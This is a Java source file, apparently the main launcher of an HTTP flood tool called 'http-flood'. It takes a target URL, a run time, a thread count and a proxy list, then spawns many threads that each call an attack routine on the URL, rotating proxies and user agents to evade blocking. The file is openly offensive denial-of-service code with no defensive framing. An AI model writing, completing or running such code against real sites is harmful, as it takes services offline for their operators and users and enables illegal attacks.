package xyz.zytanic;

import xyz.zytanic.utils.ProxyLoader;
import xyz.zytanic.utils.UserAgents;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Main {
    public static int v = 0;
    public static int e = 0;
    public static int u = 0;
    public static void main(String[] args) throws IOException {

        UserAgents.loadusergants();
        if (args.length != 4) {
            System.out.println("url time threads proxylist");
            System.out.println("Download: https://github.com/zytanic/http-flood");
            System.exit(0);
        }
        String urll = args[0];
        int time = Integer.parseInt(args[1]);
        new Thread(() -> {
            try {
                TimeUnit.SECONDS.sleep(time);
                System.exit(0);
            } catch (InterruptedException interruptedException) {
                interruptedException.printStackTrace();
            }
        }).start();

        int threads = Integer.parseInt(args[2]);
        try {
            ProxyLoader.loadproxys(args[3]);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        List<Thread> threadList = new ArrayList<>();
        e = ProxyLoader.proxyArrayList.size();
        u = UserAgents.list.size();
        for (int x = 0; x < threads; x++) {
            v++;
            new Thread(() -> {
                try {
                    Attack.attack(urll,v);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();



        }

    }
}
